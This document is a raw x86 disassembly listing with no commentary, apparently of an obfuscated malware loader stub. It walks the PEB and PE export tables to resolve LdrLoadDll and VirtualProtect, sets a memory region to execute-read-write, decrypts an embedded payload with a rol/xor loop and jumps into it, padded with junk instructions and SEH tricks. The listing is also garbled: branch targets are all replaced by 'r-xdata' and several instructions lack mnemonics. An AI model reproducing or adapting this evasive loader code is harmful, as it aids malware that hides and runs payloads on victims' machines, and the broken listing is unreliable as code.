_start
pushad
xor edi edi
push esp
and eax eax
adc edi 0x1
mov ebx [ esp ]
add esp 0x4
add edi 0x1
sub ebx 0x4
and eax eax
sbb edi 0xffffffff
neg edi
call $+5
sub [ ebx ] edi
retn
sub_1bb02030
sub esp 0x4
mov [ esp ] eax
xor eax [ esp ]
add esp 0x4
mov ecx 0x0
sub ecx eax
neg ecx
sub ch 0x1
stc
sbb ch 0x0
mov cl ch
push eax
pop ebp
call $+5
mov esi 0x0
add esi [ esp ]
inc ebp
movzx edx [ esi + ebp - 0x2 ]
sub esp 0x4
mov [ esp ] ecx
sub ecx edx
pop ecx
jne r-xdata
add [ esp ] eax
jmp [ esp ]
mov eax ebp
sub_1bb020b4
push [ fs : 0x0 ]
test edx edx
adc esi ebx
mov edx 0xffff
not eax
add esi ebx
mov [ fs : 0x0 ] esp
and esi eax
and eax eax
adc esi ebx
jmp r-xdata
call $+5
add esp 0x4
mov edi [ esp - 0x4 ]
and edi 0x0
or edi [ esp ]
mov [ fs : 0x0 ] edi
add esp 0x8
and ebx 0x0
or ebx esi
xor edi edi
xor edi [ esi + 0x3c ]
add esi edi
xor edi edi
add edi 0x4550
xor ecx ecx
add ecx [ esi ]
push ecx
and esi esi
sbb ecx edi
pop ecx
jne r-xdata
jmp [ esp ]
popad
mov eax 0x0
sub eax 0x1
neg eax
retn 0xc
sub edi edi
add edi [ esi + 0x78 ]
xor esi esi
xor esi edi
and edx edx
adc esi ebx
push esi
push [ esi + 0x20 ]
pop edi
mov esi 0x0
xor esi edi
test edx edx
adc esi ebx
sub esp 0x4
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] esi
add esp 0x4
mov esi [ esp - 0x4 ]
mov ebx [ esp ]
add esp 0x4
xor edx edx
mov eax 0x0
xor eax esi
xor ecx ecx
xor ecx [ esi ]
push ecx
pop esi
call $+5
mov ebp 0x0
add ebp esp
or ebx ebx
adc esi ebx
sub esp 0x4
mov [ esp ] 0x6c6c
add esp 0xfffffffc
mov [ esp ] 0x4464616f
call $+5
mov [ esp ] 0x4c72644c
mov edi esp
mov ecx 0x0
sub ecx 0xb
neg ecx
[ esi ] [ edi ]
je r-xdata
sub esi ebx
xor edi edi
mov edi [ esi ]
mov ecx 0x0
or ecx 0x5a4d
and edi edx
add esp 0xfffffffc
mov [ esp ] ecx
test esi esi
sbb ecx edi
pop ecx
je r-xdata
and esp 0x0
or esp ebp
mov esi [ esp ]
add esp 0x4
add esp 0xfffffffc
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
add esp 0x4
mov eax [ esp - 0x4 ]
mov ebx [ esp ]
add esp 0x4
pop esi
and edx 0x0
add edx esi
xor edi edi
add edi [ esi + 0x24 ]
and esi 0x0
or esi edi
add esi ebx
and ebx ebx
mov edi 0x0
adc edi [ esi + eax * 2 ]
and edi 0xffff
mov eax edi
and edi 0x0
add edi [ edx + 0x10 ]
test ecx ecx
sbb eax edi
test edi edi
adc eax 0x1
push [ edx + 0x1c ]
pop esi
add esi ebx
sub edi edi
add edi [ esi + eax * 4 ]
add ebx edi
test ebx ebx
mov ebp 0x0
adc ebp esp
xor edi edi
sub esp 0x4
mov [ esp ] edi
push esp
pop esi
add esp 0xfffffffc
mov [ esp ] edi
call $+5
mov [ esp ] 0x6c006c
push 0x64002e
push 0x320033
sub esp 0x4
mov [ esp ] 0x6c0065
push 0x6e0072
add esp 0xfffffffc
mov [ esp ] 0x65006b
push esp
call $+5
mov [ esp ] 0x1a0018
and ecx 0x0
or ecx esp
call $+5
mov [ esp ] esi
add esp 0xfffffffc
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] edi
sub esp 0x4
mov [ esp ] edi
push ebx
sub esp 0x4
mov [ esp ] esi
pop esi
pop ebx
call ebx
xor eax eax
or eax [ esi ]
call $+5
mov [ esp ] eax
mov edi [ esp ]
add esp 0x4
xor ecx ecx
xor ecx [ fs : 0x30 ]
and ebx 0x0
or ebx [ ecx + 0x10 ]
mov [ ebx + 0x18 ] edi
and esp 0x0
or esp ebp
xor ecx ecx
add ecx [ fs : 0x30 ]
xor ebx ebx
or ebx [ ecx + 0x10 ]
and esi 0x0
add esi [ ebx + 0x18 ]
mov ebx 0x0
xor ebx esi
mov edi [ esi + 0x3c ]
and ecx ecx
adc esi edi
mov edi 0x0
xor edi [ esi + 0x78 ]
and esi 0x0
or esi edi
add esi ebx
sub esp 0x4
mov [ esp ] esi
mov edi 0x0
add edi [ esi + 0x20 ]
or edx edx
mov esi 0x0
adc esi edi
and ebx ebx
adc esi ebx
call $+5
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] esi
pop esi
mov ebx [ esp ]
add esp 0x4
xor edx edx
mov eax 0x0
xor eax esi
sub ecx ecx
add ecx [ esi ]
push ecx
pop esi
call $+5
and ebp 0x0
add ebp esp
and eax eax
adc esi ebx
sub esp 0x4
mov [ esp ] 0x7463
call $+5
mov [ esp ] 0x65746f72
sub esp 0x4
mov [ esp ] 0x506c6175
call $+5
mov [ esp ] 0x74726956
mov edi 0x0
or edi esp
push 0xf
pop ecx
[ esi ] [ edi ]
je r-xdata
or esi esi
adc edx 0x1
add eax 0x4
mov esi 0x0
xor esi [ eax ]
xor esp esp
xor esp ebp
jmp [ esp ]
or eax eax
mov esp 0x0
adc esp ebp
mov esi [ esp ]
add esp 0x4
push ebx
sub esp 0x4
mov [ esp ] edx
add esp 0x4
mov eax [ esp - 0x4 ]
pop ebx
mov esi [ esp ]
add esp 0x4
xor edx edx
or edx esi
and edi 0x0
or edi [ esi + 0x24 ]
xor esi esi
add esi edi
and edi edi
adc esi ebx
test edx edx
mov edi 0x0
adc edi [ esi + eax * 2 ]
and edi 0xffff
sub eax eax
add eax edi
and edi 0x0
add edi [ edx + 0x10 ]
sub eax edi
test edx edx
sbb eax 0xffffffff
mov esi 0x0
or esi [ edx + 0x1c ]
add esi ebx
or edx edx
mov edi 0x0
adc edi [ esi + eax * 4 ]
and ebx ebx
adc ebx edi
xor edx edx
xor edx 0x1000
call $+5
pop esi
and esi 0xfffff000
test ecx ecx
adc esi edx
add esi edx
call $+5
mov [ esp ] esi
xor ecx ecx
or ecx 0x4
call $+5
add esi edx
xor edi edi
or edi [ esi ]
and edx edx
sbb ecx 0x1
je r-xdata
inc edx
add eax 0x4
xor esi esi
xor esi [ eax ]
xor esp esp
xor esp ebp
jmp [ esp ]
pop edi
pop esi
call $+5
mov [ esp ] edi
push esp
push 0x40
sub esp 0x4
mov [ esp ] 0x45e1
add esp 0xfffffffc
mov [ esp ] esi
add esp 0xfffffffc
mov [ esp ] ebx
call $+5
mov [ esp ] esi
pop esi
pop ebx
call $+5
pop eax
or esi esi
adc eax 0x20
add esp 0xfffffffc
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] ebp
mov ebp 0x0
sub ebp esp
neg ebp
add ebx 0x5
jmp ebx
jmp [ esp ]
sub_1bb024df
add esp 0x4
mov ebx [ esp - 0x4 ]
mov edi 0x0
add edi esi
mov eax 0x0
add eax 0xc
add edi eax
and esi 0x0
or esi edi
xor ebp ebp
xor ebp edi
xor ecx ecx
or ecx 0x453f
mov edx 0x0
add edx ecx
call $+5
add esi 0x1
pop ecx
sub ecx 0x1
je r-xdata
stosb [ edi ]
add esp 0x4
mov eax [ esp - 0x4 ]
call ebp
add eax ebx
add ecx edx
popad
mov eax 0x0
sub eax 0x1
neg eax
retn 0xc
jmp [ esp ]
and eax 0x0
add eax [ esi ]
rol al cl
xor eax edx
push ecx
xor ecx ecx
or ecx 0x40
push ebx
xor ebx ecx
pop ebx
je r-xdata
